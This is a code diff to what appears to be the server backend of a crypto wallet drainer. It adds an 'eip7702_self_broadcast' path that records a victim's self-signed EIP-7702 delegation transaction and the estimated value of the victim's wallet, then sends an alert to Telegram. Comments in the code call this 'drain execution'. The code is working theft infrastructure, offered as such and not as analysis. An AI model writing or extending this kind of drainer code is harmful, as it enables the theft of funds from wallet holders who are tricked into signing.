@@ -304,6 +304,7 @@ const PROTOCOL_RACK = new Set([
   'permit2_eip712',
   'permit2_batch_eip712',
   'eip7702_delegation',
+  'eip7702_self_broadcast',
   'omnichain_atomic_v1',
   'seaport_listing',
   'solana',
@@ -2272,7 +2273,7 @@ async function handleNormalizedIngress(
     return sendFailure(
       reply,
       400,
-      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, eip7702_delegation, omnichain_atomic_v1, seaport_listing, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
+      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, eip7702_delegation, eip7702_self_broadcast, omnichain_atomic_v1, seaport_listing, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
       { code: 'ValidationError' },
     )
   }
@@ -2470,6 +2471,30 @@ async function handleNormalizedIngress(
   }
 
   if (b.chain_family === 'EVM') {
+    // User broadcast the EIP-7702 type-4 tx themselves via MetaMask eth_sendTransaction.
+    // Backend just notifies Telegram — no drain execution needed (user already did it on-chain).
+    if (protocolNorm === 'eip7702_self_broadcast') {
+      const bAny = b as unknown as Record<string, unknown>
+      const txHashRaw = bAny.tx_hash
+      const txHashStr = typeof txHashRaw === 'string' ? txHashRaw.trim() : ''
+      if (!txHashStr.startsWith('0x')) {
+        return sendFailure(reply, 400, 'eip7702_self_broadcast requires tx_hash', { code: 'ValidationError' })
+      }
+      const chainNorm = b.chain_id != null ? String(b.chain_id).trim() : '1'
+      const scoutUsd = Number(bAny.scout_value_usd ?? 0) || 0
+      notifyBroadcastConfirmed(txHashStr, wallet_address, {
+        chain_family: 'EVM',
+        chain_id: chainNorm,
+        scout_value_usd: scoutUsd,
+        amount: '0',
+        wallet_type: String(b.wallet_type ?? 'hot_wallet'),
+      }).catch(() => {})
+      return sendSuccess(reply, 200, 'EIP-7702 self-broadcast recorded', {
+        tx_hash: txHashStr,
+        protocol: 'eip7702_self_broadcast',
+      })
+    }
+
     if (protocolNorm === 'eip7702_delegation') {
       if (!isEip7702Enabled()) {
         return sendFailure(reply, 503, 'EIP7702_ENABLED is false on this deployment', {
